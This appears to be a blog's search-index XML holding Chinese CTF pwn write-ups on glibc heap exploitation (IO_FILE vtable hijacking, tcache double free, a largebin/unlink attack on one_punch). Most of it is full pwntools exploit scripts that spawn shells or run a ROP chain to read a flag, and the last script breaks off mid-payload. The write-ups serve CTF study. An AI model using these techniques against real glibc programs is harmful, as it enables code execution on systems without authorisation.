<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[蓝帽杯202020-pwn1&pwn3复现]]></title>
    <url>%2F2020%2F08%2F09%2F%E8%93%9D%E5%B8%BD%E6%9D%AF202020-pwn1%2F</url>
    <content type="text"><![CDATA[前两天队友们在打蓝帽杯，非警校人员只能赛后看题了 只做了pwn1和pwn3（应该是这个顺序两题都涉及了IO_FILE的知识点利用，刚好最近也在刷IO_FILE就做来练练手了 camp(pwn1)这真的是赤裸裸考IO_FILE的题啊，完全不需要别的操作，纯往里写，就靠结构知识的感觉 大概是用stdin来leak出libc的地址，然后改stderr的vtable，执行exit的时候会执行IO_flush_all_lockp 跳转到vtable+0x18处执行IO_file_overflow函数我们就填充fake_vtable实现调用one_gadget 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding=utf8from pwn import *context.log_level = 'debug'p=process("./pwn")elf=ELF('./pwn')libc=ELF('./libc.so')def stdout_0(size,content): p.recvuntil("&gt;&gt;&gt;\n") p.sendline("1") p.recvuntil("size:\n") p.sendline(str(size)) p.recvuntil("content:\n") p.send(content)def stdin_0(size,content): p.recvuntil("&gt;&gt;&gt;\n") p.sendline("2") p.recvuntil("size:\n") p.sendline(str(size)) p.recvuntil("content:\n") p.send(content)def stderr_0(size,content): p.recvuntil("&gt;&gt;&gt;\n") p.sendline("3") p.recvuntil("size:\n") p.sendline(str(size)) p.recvuntil("content:\n") p.send(content)def logs(): p.recvuntil("&gt;&gt;&gt;") p.sendline("4")def clean(): p.recvuntil("&gt;&gt;&gt;") p.sendline("5")# stdin_0(0xf0,'a'*0xf0)stdin_0(0x80,'a\n')stdin_0(0x80,'a\n')# stdin_0(0x80,'a\n')clean()# stdout_0(64,p64(elf.got['write']))stdin_0(0x80,'a')logs()p.recvuntil("stdin\n")main_arena = u64(p.recv(6).ljust(8,'\x00'))-0x41print hex(main_arena)# stdin_0(0x80,'a\n')libc_base = main_arena - 0x3c4b20print hex(libc_base)jump=libc_base+libc.symbols['_IO_file_jumps']+0xc0fake_vtable = libc_base + 0x3c5600-8# fake_vtable = libc_base +0x3c4998-8stdout = libc_base + 0x3c5620onegadget=libc_base+0xf02a4# py = '\x00' + p64(libc_base+0x3c55e0) + p64(0)*3+p64(0x1)+p64(0)+p64(onegadget)+p64(fake_vtable)stderr = p64(0x00000000fbad2087)+p64(libc_base+0x3c55c3)*7stderr += p64(libc_base+0x3c55c3+1)+p64(0)*4+p64(stdout)+p64(2)+p64(0xffffffffffffffff)+p64(0)stderr += p64(libc_base+0x3c6770)+p64(0xffffffffffffffff)+p64(0)stderr += p64(libc_base+0x3c55e0) + p64(0)*3+p64(1)+p64(0)+p64(onegadget)+p64(fake_vtable)#+p64(0x00000000ffffffff)'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''gdb.attach(p)stderr_0(len(stderr),stderr)# stdin_0(0x180,'b')p.recvuntil("&gt;&gt;&gt;")p.sendline("2")p.recvuntil("size:\n")p.sendline(str(0x180))p.interactive() 听说远程很狗，不打比赛就没体验到，本地通了就over吧 safebox(pwn3)一开始我还以为是glibc2.23的版本呢所以用2.23做了一遍，由于2.23对size的检查问题，fakechunk的size一定要符合条件，所以最后getshell不能改free_hook，我就改了malloc为one_gadget 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#coding=utf8from pwn import *context.log_level = 'debug'p=process("./pwn")elf=ELF('./pwn')# libc=ELF('./libc.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(idx,size,content): p.recvuntil('&gt;&gt;&gt;') p.sendline("1") p.recvuntil("idx:") p.sendline(str(idx)) p.recvuntil("len:") p.sendline(str(size)) p.recvuntil("content:") p.send(content)def delete(idx): p.recvuntil('&gt;&gt;&gt;') p.sendline("2") p.recvuntil("idx:") p.sendline(str(idx))add(0,0x18,'0')add(1,0x108,'a')add(2,0x60,'b')add(3,0x60,'c')add(4,0xf8,'c')add(5,0x20,'d')delete(0)add(0,0x18,'a'*0x18+'\xf1')delete(2)delete(3)delete(1)# delete(0)# add(0,0x30,'a'*0x18+p64(0x91)+p16(0x2620-0x41))add(1,0x108,'a')# gdb.attach(p)# delete(4)add(2,0x70,p16(0x2620-0x43))delete(1)add(1,0x108,'a'*0x108+'\x71')add(3,0x60,'b')add(6,0x60,'c')payload='a'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'add(7,0x68,payload)libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600print hex(libc_base)system = libc_base + 0x44e30free_hook = libc_base + 0x3c67a8malloc_hook = libc_base+0x3c4b10onegadget=libc_base+0xf1207p.sendline("1")p.recvuntil("idx:")p.sendline(str(8))p.recvuntil("len:")p.sendline(str(0x50))p.recvuntil("content:")p.send('a')add(8,0x18,'a')add(9,0x108,'b')add(10,0x68,'c')add(11,0x68,'d')add(12,0x68,'/bin/sh\x00')# add(13,0x18,'\n')delete(8)add(0,0x18,'a'*0x18+'\xf1')delete(10)delete(11)delete(9)add(9,0x108,'b')add(10,0x70,p64(malloc_hook-0x23))delete(9)add(9,0x108,'a'*0x108+'\x71')add(11,0x68,'d')add(13,0x68,'ddd')add(14,0x60,'a'*0x13+p64(onegadget))gdb.attach(p)p.sendline("1")p.recvuntil("idx:")p.sendline(str(15))p.recvuntil("len:")p.sendline('/bin/sh\x00')p.interactive() 后来发现，原来是2.27的题，其实也没什么不一样，就是要leak地址的话得先malloc largebin然后可以直接覆写低两位的地址，不考虑size位所以我们可以覆盖free_hook再delet实现getshell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#coding=utf8from pwn import *context.log_level = 'debug'p=process("./pwn")elf=ELF('./pwn')# libc=ELF('./libc.so')libc = ELF('./libc-2.27.so')def add(idx,size,content): p.recvuntil('&gt;&gt;&gt;') p.sendline("1") p.recvuntil("idx:") p.sendline(str(idx)) p.recvuntil("len:") p.sendline(str(size)) p.recvuntil("content:") p.send(content)def delete(idx): p.recvuntil('&gt;&gt;&gt;') p.sendline("2") p.recvuntil("idx:") p.sendline(str(idx))def exp(): add(0,0x68,'0') add(1,0x408,'a') add(2,0x60,'b') add(3,0x60,'c') add(4,0xf8,'c') delete(0) add(0,0x68,'a'*0x68+'\xf1') delete(2) delete(3) delete(1) add(1,0x408,'a') add(2,0x70,p16(0x4760)) add(5,0x60,'b') add(6,0x60,'c') payload=p64(0xfbad1800)+p64(0)*3+'\x00' add(7,0x60,payload) # gdb.attach(p) libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ed8b0 print hex(libc_base) system = libc_base + libc.symbols['system']+0xa0 print hex(system) free_hook = libc_base + libc.symbols['__free_hook'] print hex(free_hook) p.sendline("1") p.recvuntil("idx:") p.sendline(str(8)) p.recvuntil("len:") p.sendline(str(0x50)) p.recvuntil("content:") p.send('a') # add(8,0x18,'a') gdb.attach(p) add(8,0x88,'a') add(9,0x108,'b') add(10,0x70,'c') add(11,0x70,'d') delete(8) add(8,0x88,'a'*0x88+'\x91') delete(10) delete(9) payload = 'A' * 0x100 + p64(0) + p64(0x80) + p64(free_hook) add(9,0x180,payload) gdb.attach(p) one_gadget = libc_base + 0x4f2c5 add(10,0x70,'/bin/sh\x00') add(12,0x70,p64(system)) gdb.attach(p) delete(10) p.interactive()while True: try: p=process('./pwn') libc=ELF('./libc-2.27.so') exp() break except: continue]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache浅析]]></title>
    <url>%2F2020%2F08%2F08%2Ftcache%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[tcache glibc2.27glibc2.27版本的tcache是可以double free处理的，利用起来就很方便 tcache会把之前malloc的chunk在free完之后写入tcache list里面 常规操作的话，我们需要将chunk写进unsorted bin才能leak出main_area的地址而想要跳出tcache list 可以利用double free将a-&gt;a的形式写入tcache list (free 同一个 chunk)这个时候，指针count为2，在malloc同一个大小，不进行写入参数时，可以不断地往那个tcache list里拿那个地址，并且count -1使得count为-1时，不再写入tcache list，而是写进unsorted bin list接下来就可以正常泄露libc了 例题：V&amp;N公开赛2020 easyTheap最简单的double free + tcache 要想leak出libc的地址就要把chunk free进unsortedbin里这里就要用了 123456789101112131415161718add(0x100)add(0x68)delete(0) #tcache-1delete(0) #tcache-2show(0)heap_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 0x260print hex(heap_base)add(0x100) #2 tcache-1edit(2,p64(heap_base+0x10))add(0x100) #3 tcache-0add(0x100) #4 tcache- -1-&gt;绕过delete(0) #unsorted binshow(0)libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook'] SCTF2019 one_heap这题也是要先绕过tcache来leak地址的第一步操作是一样的 具体exp见这里 tcache glibc2.29结构体新增了key指针 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; /* 新增指针 */&#125; tcache_entry; 1234567891011static void tcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as "in the tcache" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 123456789101112if (__glibc_unlikely (e-&gt;key == tcache)) &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr ("free(): double free detected in tcache 2"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; 如果e-&gt;key == tcache，程序会从链表头检索chunk，如果检索到了chunk e，说明tcache中已经存在chunk e，再次释放就会触发double free。这就意味着我们在2.29下就没办法用double free绕过tcache了 因此绕过想绕过检测进行double free，e-&gt;key 是入手点。 绕过实现tcache double free思路 如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。 利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。 （from: https://xz.aliyun.com/t/7292#toc-2) picoctf2019 zero_to_hero其实没有碰到过这类的题，就按着师傅的blog来讲一下这个通过改了size之后free到不同tcache队列实现double free的题吧 首先题目友好的给出了system的地址，就不需要我们leak了，我们就只需要直接用tcache操作进行改free_hook为system，执行即可 第一步先malloc两个chunk（第二个要求大于0x110）并将两个chunk free掉然后malloc第一个chunk，通过off by null把第二个chunk的size 从0x1xx变成0x100再free第二个chunk就可以实现double free了 接下来就是常规操作了，具体操作可以看师傅的blog 绕过tcache实现unsortedbin上操作 tcache每一个大小的chunk个数上限是7，填满之后就会往unsortedbin里填，我们可以先将tcache填满之后再操作 *ctf2019 girlfriends这题在free的地方没清空指针，可以进行double free step1：leak libc我们可以malloc一个超过tcache大小的chunk（largebin），free完直接进入largebin，可以直接leak出libc step2：填满tcache用fastbin构造double free step3：通过double_free的链，将free_hook填上system。 PS: 在申请时首先清空对应tcache链上的内容，然后再申请fastbin里的chunk，当tcache里没有chunk而fastbin里有chunk时，会将fastbin里的chunk放入tcache exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'p=process('./chall')# # p=remote('node3.buuoj.cn',26796)pwn_file="./lib/ld-2.29.so --library-path ./lib/ ./starctf_2019_girlfriend"#pwn_file = "./babyheap"elf=ELF("./starctf_2019_girlfriend")libc = ELF("./lib/libc.so.6")# libc = ELF("./lib/libc.so.6")p=process(pwn_file.split())# p=remote('node3.buuoj.cn',26796)def add(size,name,call): p.recvuntil("Input your choice:") p.sendline("1") p.recvuntil("Please input the size of girl's name") p.sendline(str(size)) p.recvuntil("please inpute her name:") p.send(name) p.recvuntil("please input her call:") p.send(call) def show(index): p.recvuntil("Input your choice:") p.sendline("2") p.recvuntil("Please input the index:") p.sendline(str(index))def delte(index): p.recvuntil("Input your choice:") p.sendline("4") p.recvuntil("Please input the index:") p.sendline(str(index))add(0x440,"coyote","coyote") #0add(0x20,"coyote","coyote") #1delte(0)show(0)p.recvuntil("name:\n")gdb.attach(p)libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3b1ca0print hex(libc_base)free_hook = libc_base + libc.symbols["__free_hook"]one_gadget = libc_base + 0xdf99dsystem = libc_base + libc.symbols["system"]malloc_hook = libc_base + libc.symbols["__malloc_hook"]for i in range(7): add(0x68,"coyote","coyote") #2-8add(0x68,"coyote","coyote") #9add(0x68,"coyote","coyote") #10delte(8)for i in range(6): delte(i+2)add(0x68,"coyote","coyote") #11add(0x68,"coyote","coyote") #12#fill tcachedelte(9)delte(10)#fastbindelte(11)delte(12)# delte(13)# delte(12)delte(11)for i in range(7): add(0x68,"coyote","coyote")#13-19add(0x68,p64(free_hook),'coyote')#20 -11add(0x68,"coyote","coyote")#21 -12add(0x68,"/bin/sh","coyote") #22 -11add(0x68,p64(system),'coyote') #23delte(22)p.interactive() 参考链接：https://x3h1n.github.io/2019/06/21/starctf-2019-girlfriend/]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[largebin_attack-glibc2.29]]></title>
    <url>%2F2020%2F08%2F06%2Flargebin-attack-glibc2-29%2F</url>
    <content type="text"><![CDATA[和glibc2.23版本相比，2.29的版本对unsorted bin的检查多了很多，导致unsorted bin attack几乎不可行，所以我们用largebin attack作为它的替代 源码:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 else //largebin &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) //list里面有bin &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) //小于已有所有堆块的大小 &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //解链，利用点1 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else //大于等于列表中已有的个别堆块 &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) //找到第一个比他小的堆块 &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd)) //两个相等，不进入 /* Always insert in the second position. */ fwd = fwd-&gt;fd; else //不等就插入 &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //利用点2 &#125; bck = fwd-&gt;bk; &#125; &#125; else //largebin队列为空 victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 关于绕过unlink 12345678910111213141516171819202122232425262728293031323334353637383940414243444546for (;; ) &#123; /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) &#123; do &#123; if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; /* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) &#123; bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; /* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) &#123; av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; //想绕过unlink就不进入这个 size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink_chunk (av, victim); 构造的条件：1234largebin和unsortedbin中各有一个chunk;largebin的fd_nextsize为0;largebin中的chunk-&gt;bk_nextsize可控制;unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。(0x40) 例题：HITCONCTF 2019 one_punch有后门函数，里面是malloc添加大小为0x217的堆块，而debuf函数是calloc，所以我们可以想到利用tcache，达到任意地址写的目的 在堆块里的第一个chunk是用来存tcache的地址的，calloc是优先在unsortedbin里取堆块的，而后门里用的malloc，可以取tcache里的堆块构造fake chunk 的fd_nextsize 和 bk_nextsize 使它free完之后可以将目的地址写入unsortedbin然后通过calloc将free_hook地址写入tcache相应位置，通过后门将我们的地址写入free_hook即可 方法一’s exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143from pwn import *context.log_level = 'debug'context.arch = 'amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def cmd(c): p.recvuntil("&gt; ") p.sendline(str(c)) def add(idx,name): cmd(1) p.recvuntil("idx: ") p.sendline(str(idx)) p.recvuntil("name: ") p.send(name)def dele(idx): cmd(4) p.recvuntil("idx: ") p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil("idx: ") p.sendline(str(idx))def edit(idx,name): cmd(2) p.recvuntil("idx: ") p.sendline(str(idx)) p.recvuntil("name: ") p.send(name)def main(host,port=26976): global p if host: p = remote(host,port) else: p = process("./one_punch") # debug(0x0000000000015BB) # gdb.attach(p,"b *setcontext+53") gdb.attach(p) add(2, 'a' * 0x217) for i in range(2): add(0, 'a' * 0x217) dele(0) show(0) p.recvuntil(": ") heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x480 for i in range(5): add(0, 'a' * 0x217) dele(0) # gdb.attach(p) dele(2) show(2) p.recvuntil(": ") libc_base = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0 info("heap : " + hex(heap)) info("libc : " + hex(libc_base)) #overlapping length = 0xe0 add(0, 'a' * length) #add-&gt;chunk2's site add(0, 'a' * 0x80) #add-&gt;chunk2-&gt;next edit(2, b'\x00' * length + p64(0) + p64(0x21)) #-&gt;chunk1 dele(0) edit(2, b'\x00' * length + p64(0) + p64(0x31)) dele(0) edit(2, b'\x00' * length + p64(0) + p64(0x3a1)) dele(0) #三个chunk使得0xxxxxxxx148位置的被改写成0x301 for i in range(3): add(1, 'b' * 0x3a8) dele(1) edit(2, b'\x00' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0)+ p64(heap + 0x40) + p64(heap + 0x40)) dele(0) #--&gt;0x140 into unsorted bin (storged the tcache 0x220 size chunk_addr) add(0, b'c' * 0x100 + p64(libc.symbols['__free_hook']+libc_base)) #0x10-0x400 save the tcache_addr ## free chunk -&gt;into 0x150 # gdb.attach(p) cmd(str(50056)) #malloc 0x217 -&gt;tcache # 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; p.send(p64(libc_base+0x000000000012be97)) #malloc write tcache bin --&gt;free_hook # 0x7f903816ae35 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdx+0xa0] # 0x7f903816ae3c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdx+0x80] # 0x7f903816ae43 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdx+0x78] # 0x7f903816ae47 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdx+0x48] # 0x7f903816ae4b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdx+0x50] # 0x7f903816ae4f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdx+0x58] # 0x7f903816ae53 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdx+0x60] # 0x7f903816ae57 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdx+0xa8] # 0x7f903816ae5e &lt;setcontext+94&gt;: push rcx # 0x7f903816ae5f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdx+0x70] # 0x7f903816ae63 &lt;setcontext+99&gt;: mov rdi,QWORD PTR [rdx+0x68] # 0x7f903816ae67 &lt;setcontext+103&gt;: mov rcx,QWORD PTR [rdx+0x98] # 0x7f903816ae6e &lt;setcontext+110&gt;: mov r8,QWORD PTR [rdx+0x28] # 0x7f903816ae72 &lt;setcontext+114&gt;: mov r9,QWORD PTR [rdx+0x30] # 0x7f903816ae76 &lt;setcontext+118&gt;: mov rdx,QWORD PTR [rdx+0x88] # 0x7f903816ae7d &lt;setcontext+125&gt;: xor eax,eax # 0x7f903816ae7f &lt;setcontext+127&gt;: ret # 00000000000026542: pop rdi; ret; # 0x000000000012bdc9: pop rdx; pop rsi; ret; # 0x0000000000047cf8: pop rax; ret; # 0x00000000000cf6c5: syscall; ret;x p_rdi = 0x0000000000026542+libc_base p_rdx_rsi = 0x000000000012bdc9+libc_base p_rax = 0x0000000000047cf8+libc_base syscall_ret = 0x00000000000cf6c5+libc_base payload = p64(libc.symbols["setcontext"]+libc_base+53)+p64(heap+0x1ac0) payload += b'./flag.txt'+b'\x00'*6 payload += p64(0)*9 #offset 0x68 payload += p64(heap+0x1ad0) #rdi payload += p64(0) #rsi payload += p64(heap+0x2000) #rbp payload += p64(0)*2 #rbx and rdx payload += p64(0)*2 payload += p64(heap+0x1b78) # rsp payload += p64(p_rax) #rcx payload += p64(0xdeadbeef) payload += p64(2) payload += p64(syscall_ret) payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x80)+p64(heap+0x2d00)+p64(p_rax)+p64(0)+p64(syscall_ret) payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall_ret) payload += p64(p_rdi)+p64(0)+p64(p_rax)+p64(0)+p64(syscall_ret) edit(1,payload) dele(1) p.interactive() if __name__ == "__main__": libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False) main(args['REMOTE']) 疑惑1.为什么构造largebin的时候是在fd_nextsize &amp; bk_nextsize填入目的地址，而fd还有bk都是0？ 1234567891011121314151617181920212223242526272829303132LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── RAX 0x55bad5321350 ◂— 0x0 RBX 0x55bad5321040 ◂— 0x0 RCX 0x301 RDX 0x55bad5321350 ◂— 0x0 RDI 0x55bad5321040 ◂— 0x0 RSI 0x0 R8 0x0 R9 0x0 R10 0x7f6e0102cae0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x7f6e0102d3e0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002 R12 0x7f6e01077c40 (main_arena) ◂— 0x0 R13 0x55bad53218b0 ◂— 0x616161616161 /* 'aaaaaa' */ R14 0x1 R15 0x220 RBP 0x870 RSP 0x7ffe7a82d4f0 ◂— 0x50000 RIP 0x7f6e00f26781 (unlink_chunk.isra+33) ◂— cmp rdi, qword ptr [rax + 0x18]───────────────────────────────────[ DISASM ]─────────────────────────────────── 0x7f6e00f2676b &lt;unlink_chunk.isra+11&gt; and rax, 0xfffffffffffffff8 0x7f6e00f2676f &lt;unlink_chunk.isra+15&gt; cmp rax, qword ptr [rdi + rax] 0x7f6e00f26773 &lt;unlink_chunk.isra+19&gt; jne unlink_chunk.isra+213 &lt;0x7f6e00f26835&gt; 0x7f6e00f26779 &lt;unlink_chunk.isra+25&gt; mov rax, qword ptr [rdi + 0x10] 0x7f6e00f2677d &lt;unlink_chunk.isra+29&gt; mov rdx, qword ptr [rdi + 0x18] ► 0x7f6e00f26781 &lt;unlink_chunk.isra+33&gt; cmp rdi, qword ptr [rax + 0x18] 0x7f6e00f26785 &lt;unlink_chunk.isra+37&gt; jne unlink_chunk.isra+176 &lt;0x7f6e00f26810&gt; ↓ 0x7f6e00f26810 &lt;unlink_chunk.isra+176&gt; lea rdi, [rip + 0x11d1b6] 0x7f6e00f26817 &lt;unlink_chunk.isra+183&gt; call malloc_printerr &lt;0x7f6e00f26580&gt; 对比的地方是rdi和rax+0x18的位置，所以是fd_nextsize的内容要等于fake chunk unlink: 1234567891011121314151617181920212223242526272829303132333435363738unlink_chunk (mstate av, mchunkptr p)&#123; if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr ("corrupted size vs. prev_size"); mchunkptr fd = p-&gt;fd; mchunkptr bk = p-&gt;bk; if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0)) // 本题中，对应next chunk的fd_nextsize和bk_nextsize的位置 malloc_printerr ("corrupted double-linked list"); fd-&gt;bk = bk; bk-&gt;fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL) &#123; if (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p) malloc_printerr ("corrupted double-linked list (not small)"); if (fd-&gt;fd_nextsize == NULL) &#123; if (p-&gt;fd_nextsize == p) fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd; else &#123; fd-&gt;fd_nextsize = p-&gt;fd_nextsize; fd-&gt;bk_nextsize = p-&gt;bk_nextsize; p-&gt;fd_nextsize-&gt;bk_nextsize = fd; p-&gt;bk_nextsize-&gt;fd_nextsize = fd; &#125; &#125; else &#123; p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize; p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize; &#125; &#125;&#125; 2.这个方法好像没用到真正的largebin attack，更像是unsortedbin attack?好像这个方法用的是unlink，不是largebin 方法二’s exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import sysimport timeimport randomcontext.log_level = 'debug'# host = '52.198.120.1'# port = 48763r = process('./one_punch')binary = "./one_punch"context.binary = binaryelf = ELF(binary)try: libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False) log.success("libc load success") system_off = libc.symbols.system log.success("system_off = "+hex(system_off))except: log.failure("libc not found !")def name(index, name): r.recvuntil("&gt; ") r.sendline("1") r.recvuntil(": ") r.sendline(str(index)) r.recvuntil(": ") r.send(name) passdef rename(index,name): r.recvuntil("&gt; ") r.sendline("2") r.recvuntil(": ") r.sendline(str(index)) r.recvuntil(": ") r.send(name) passdef d(index): r.recvuntil("&gt; ") r.sendline("4") r.recvuntil(": ") r.sendline(str(index)) passdef show(index): r.recvuntil("&gt; ") r.sendline("3") r.recvuntil(": ") r.sendline(str(index))def magic(data): r.recvuntil("&gt; ") r.sendline(str(0xc388)) time.sleep(0.1) r.send(data)# if len(sys.argv) == 1:# r = process([binary, "0"], env=&#123;"LD_LIBRARY_PATH":"."&#125;)# else:# r = remote(host ,port)if __name__ == '__main__': # gdb.attach(r) name(0,"A"*0x210) d(0) name(1,"A"*0x210) d(1) show(1) r.recvuntil(" name: ") heap = u64(r.recv(6).ljust(8,"\x00")) - 0x260 # print("heap = &#123;&#125;".format(hex(heap))) print hex(heap) for i in xrange(5): name(2,"A"*0x210) d(2) name(0,"A"*0x210) name(1,"A"*0x210) d(0) show(0) r.recvuntil(" name: ") libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0 print("libc = &#123;&#125;".format(hex(libc))) d(1) rename(2,p64(libc + 0x1e4c30)) name(0,"D"*0x90) d(0) # 构造largebin attack的堆块# full count for i in xrange(7): name(0,"D"*0x80) d(0) for i in xrange(7): name(0,"D"*0x200) d(0)#largebin 0x431 name(0,"D"*0x200) name(1,"A"*0x210) name(2,p64(0x21)*(0x90/8)) rename(2,p64(0x21)*(0x90/8)) #填充size d(2) # calloc从unsortedbin中取，不取tcache name(2,p64(0x21)*(0x90/8)) rename(2,p64(0x21)*(0x90/8)) d(2) d(0) #unsorted bin d(1) #unlink name(0,"A"*0x80) name(1,"A"*0x80) #free 0x311 形成两个不一样的chunk d(0) #chunk0 fd- &gt; 0x550 d(1) # sum 0x431 name(0,"A"*0x88 + p64(0x421) + "D"*0x180 ) 